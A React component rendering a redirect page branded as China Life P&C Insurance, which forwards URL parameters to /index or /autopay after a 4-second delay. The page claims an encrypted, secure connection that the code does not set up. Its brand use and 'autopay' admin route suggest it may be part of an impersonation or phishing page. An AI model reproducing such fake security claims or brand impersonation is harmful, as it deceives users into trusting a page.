
import React, { useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

const Buffer: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const searchParams = new URLSearchParams(location.search);
  
  const dataParam = searchParams.get('data');
  const idParam = searchParams.get('id');

  useEffect(() => {
    // 强制停留 4 秒，符合业务安全规范
    const timer = setTimeout(() => {
      const targetParams = new URLSearchParams();
      if (idParam) targetParams.set('id', idParam);
      if (dataParam) targetParams.set('data', dataParam);

      const queryString = targetParams.toString();
      // 如果没有参数，默认跳回管理端，避免页面死锁
      if (queryString) {
        navigate(`/index?${queryString}`);
      } else {
        navigate('/autopay');
      }
    }, 4000); 
    return () => clearTimeout(timer);
  }, [dataParam, idParam, navigate]);

  return (
    <div className="min-h-screen flex flex-col bg-jh-light font-sans">
      {/* 全局页头 Banner */}
      <div className="w-full bg-white">
        <img src="/logo.jpeg" className="w-full h-auto block" alt="China Life Banner" />
      </div>
      
      <header className="bg-jh-header text-white h-12 flex items-center justify-center px-4 shadow-sm z-50 sticky top-0">
        <h1 className="text-lg font-bold tracking-wide">授权登录</h1>
      </header>

      <div className="flex-1 flex flex-col items-center justify-center p-8 -mt-12">
        <div className="mb-12 relative">
           <div className="w-14 h-14 border-[3px] border-gray-100 border-t-jh-header rounded-full animate-spin"></div>
           <div className="absolute inset-0 flex items-center justify-center">
              <div className="w-2 h-2 bg-jh-header rounded-full animate-pulse"></div>
           </div>
        </div>
        <div className="text-center space-y-4 max-w-xs mx-auto">
            <h2 className="text-jh-text font-black text-xl tracking-tight">正在安全跳转</h2>
            <p className="text-sm text-gray-500 leading-relaxed font-medium opacity-80">
              正在进入中国人寿财险空中投保服务，系统正在为您建立加密连接，请稍候...
            </p>
        </div>
        <div className="mt-16 flex items-center gap-1.5 text-[10px] text-emerald-600 bg-emerald-50 px-4 py-2 rounded-full border border-emerald-100 font-black uppercase tracking-widest">
           <span>🛡️ 平台已加密保护</span>
        </div>
      </div>

      <div className="pb-8 text-center px-6">
         <p className="text-[9px] text-gray-300 uppercase tracking-[0.3em] font-bold">Copyright © China Life Property & Casualty Insurance</p>
      </div>
    </div>
  );
};

export default Buffer;
